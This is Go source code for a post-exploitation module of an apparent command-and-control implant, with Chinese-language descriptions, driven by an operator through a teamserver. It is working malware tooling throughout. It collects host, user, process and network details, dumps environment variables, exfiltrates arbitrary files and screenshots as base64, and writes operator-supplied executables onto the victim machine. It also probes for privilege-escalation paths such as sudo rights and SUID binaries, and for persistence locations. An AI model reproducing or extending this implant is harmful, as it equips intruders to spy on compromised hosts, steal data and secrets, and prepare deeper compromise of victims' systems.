package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// postexModule is a beacon-side post-exploitation module. Modules run on the
// target host and return structured JSON; the operator/agent drives them via
// `postex <module> [args]` tasks.
type postexModule struct {
	Name        string
	Description string
	Args        string // optional extra argument description
}

var postexModules = []postexModule{
	{Name: "info", Description: "系统信息（OS/主机名/用户/CPU/内存/磁盘）"},
	{Name: "ps", Description: "进程列表"},
	{Name: "netstat", Description: "网络连接"},
	{Name: "whoami", Description: "当前用户 / 权限"},
	{Name: "users", Description: "已登录用户"},
	{Name: "env", Description: "环境变量"},
	{Name: "ls", Description: "目录列表", Args: "path（默认当前目录）"},
	{Name: "download", Description: "下载文件（base64 返回）", Args: "path"},
	{Name: "upload", Description: "上传文件（base64 写入）", Args: "path b64data"},
	{Name: "screenshot", Description: "屏幕截图（base64 返回）"},
	{Name: "escalate", Description: "提权侦察（sudo -l / 管理员状态）"},
	{Name: "persist", Description: "持久化侦察（计划任务 / cron / systemd）"},
}

// runPostex dispatches a post-exploitation module and returns structured output.
func runPostex(mod, args string) (map[string]any, error) {
	switch strings.TrimSpace(mod) {
	case "info":
		return postexInfo()
	case "ps":
		return postexPS()
	case "netstat":
		return postexNetstat()
	case "whoami":
		return postexWhoami()
	case "users":
		return postexUsers()
	case "env":
		return postexEnv()
	case "ls":
		return postexLS(args)
	case "download":
		return postexDownload(args)
	case "upload":
		parts := strings.SplitN(args, " ", 2)
		if len(parts) < 2 {
			return nil, fmt.Errorf("upload 需要 path 和 base64 数据")
		}
		return postexUpload(parts[0], strings.TrimSpace(parts[1]))
	case "screenshot":
		return postexScreenshot()
	case "escalate":
		return postexEscalate()
	case "persist":
		return postexPersist()
	default:
		return nil, fmt.Errorf("未知模块: %s", mod)
	}
}

func sh(command string) string {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", command)
	} else {
		c = exec.Command("/bin/sh", "-c", command)
	}
	out, _ := c.CombinedOutput()
	return strings.TrimSpace(string(out))
}

func postexInfo() (map[string]any, error) {
	hostname, _ := os.Hostname()
	out := map[string]any{
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"hostname": hostname,
		"pid":      os.Getpid(),
		"exe":      os.Args[0],
	}
	switch runtime.GOOS {
	case "windows":
		out["os_version"] = sh("ver")
		out["cpu"] = sh("echo %NUMBER_OF_PROCESSORS%")
		out["memory"] = sh("wmic ComputerSystem get TotalPhysicalMemory /value")
	case "linux":
		out["os_version"] = strings.TrimSpace(sh("cat /etc/os-release 2>/dev/null | head -5"))
		out["kernel"] = sh("uname -r")
		out["cpu"] = sh("lscpu 2>/dev/null | grep -i 'model name' | head -1")
		out["memory"] = sh("free -h | head -2")
		out["disk"] = sh("df -h / 2>/dev/null | tail -1")
	}
	return out, nil
}

func postexPS() (map[string]any, error) {
	if runtime.GOOS == "windows" {
		return map[string]any{"processes": sh("tasklist")}, nil
	}
	return map[string]any{"processes": sh("ps aux --sort=-%cpu | head -50")}, nil
}

func postexNetstat() (map[string]any, error) {
	if runtime.GOOS == "windows" {
		return map[string]any{"connections": sh("netstat -ano")}, nil
	}
	return map[string]any{"connections": sh("netstat -tulnp 2>/dev/null || netstat -tuln")}, nil
}

func postexWhoami() (map[string]any, error) {
	if runtime.GOOS == "windows" {
		return map[string]any{
			"user":   sh("whoami"),
			"groups": sh("whoami /groups | findstr /i \"S-1-16\""),
			"admin":  sh("net session >nul 2>&1 && echo YES || echo NO"),
		}, nil
	}
	return map[string]any{
		"user": sh("id"),
		"sudo": sh("sudo -n -l 2>&1 | head -20"),
	}, nil
}

func postexUsers() (map[string]any, error) {
	if runtime.GOOS == "windows" {
		return map[string]any{"sessions": sh("query user 2>&1"), "local_users": sh("net user")}, nil
	}
	return map[string]any{"who": sh("who 2>&1"), "users": sh("cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v /false | head -40")}, nil
}

func postexEnv() (map[string]any, error) {
	envs := map[string]string{}
	for _, kv := range os.Environ() {
		if i := strings.Index(kv, "="); i > 0 {
			envs[kv[:i]] = kv[i+1:]
		}
	}
	return map[string]any{"env": envs}, nil
}

func postexLS(path string) (map[string]any, error) {
	if strings.TrimSpace(path) == "" {
		path = "."
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return nil, err
	}
	var items []map[string]any
	for _, e := range entries {
		fi, _ := e.Info()
		size := int64(0)
		mod := ""
		if fi != nil {
			size = fi.Size()
			mod = fi.ModTime().Format("2006-01-02 15:04")
		}
		items = append(items, map[string]any{
			"name": e.Name(), "dir": e.IsDir(), "size": size, "mod": mod,
		})
	}
	return map[string]any{"path": path, "items": items}, nil
}

func postexDownload(path string) (map[string]any, error) {
	if strings.TrimSpace(path) == "" {
		return nil, fmt.Errorf("download 需要 path")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	return map[string]any{
		"path":     path,
		"size":     len(data),
		"data_b64": base64.StdEncoding.EncodeToString(data),
	}, nil
}

func postexUpload(path, b64 string) (map[string]any, error) {
	data, err := base64.StdEncoding.DecodeString(strings.TrimSpace(b64))
	if err != nil {
		return nil, fmt.Errorf("base64 解码失败: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return nil, err
	}
	if err := os.WriteFile(path, data, 0o755); err != nil {
		return nil, err
	}
	return map[string]any{"path": path, "written": len(data)}, nil
}

func postexScreenshot() (map[string]any, error) {
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("shot_%d.png", os.Getpid()))
	var cmd string
	if runtime.GOOS == "windows" {
		cmd = fmt.Sprintf("powershell -NoProfile -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); $bmp.Save('%s',[System.Drawing.Imaging.ImageFormat]::Png)\"", tmp)
	} else {
		cmd = fmt.Sprintf("(import -window root %s 2>/dev/null || scrot %s 2>/dev/null) ; echo done", tmp, tmp)
	}
	_ = sh(cmd)
	data, err := os.ReadFile(tmp)
	if err != nil {
		return nil, fmt.Errorf("截图失败（可能需要图形环境/工具）: %v", err)
	}
	_ = os.Remove(tmp)
	return map[string]any{"size": len(data), "data_b64": base64.StdEncoding.EncodeToString(data)}, nil
}

func postexEscalate() (map[string]any, error) {
	if runtime.GOOS == "windows" {
		return map[string]any{
			"admin":      sh("net session >nul 2>&1 && echo YES || echo NO"),
			"integrity":  sh("whoami /groups | findstr /i \"S-1-16\""),
			"uac_status": sh("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA 2>&1"),
		}, nil
	}
	return map[string]any{
		"sudo":    sh("sudo -n -l 2>&1 | head -25"),
		"uid":     sh("id"),
		"capabil": sh("grep Cap /proc/self/status 2>/dev/null"),
		"suid":    sh("find / -perm -4000 -type f 2>/dev/null | head -20"),
	}, nil
}

func postexPersist() (map[string]any, error) {
	if runtime.GOOS == "windows" {
		return map[string]any{
			"schtasks": sh("schtasks /query /fo LIST 2>&1 | findstr /i \"TaskName\" | head -30"),
			"run_keys": sh("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1"),
			"services": sh("sc query state= all 2>&1 | findstr /i \"SERVICE_NAME\" | head -30"),
		}, nil
	}
	return map[string]any{
		"crontab": sh("crontab -l 2>&1 | head -20"),
		"systemd": sh("systemctl --user list-unit-files --state=enabled 2>/dev/null | head -20 || true"),
		"initd":   sh("ls /etc/init.d 2>/dev/null | head -20"),
	}, nil
}

// postexModuleCatalog returns the supported module list (used by the teamserver).
func postexModuleCatalog() string {
	b, _ := json.Marshal(postexModules)
	return string(b)
}
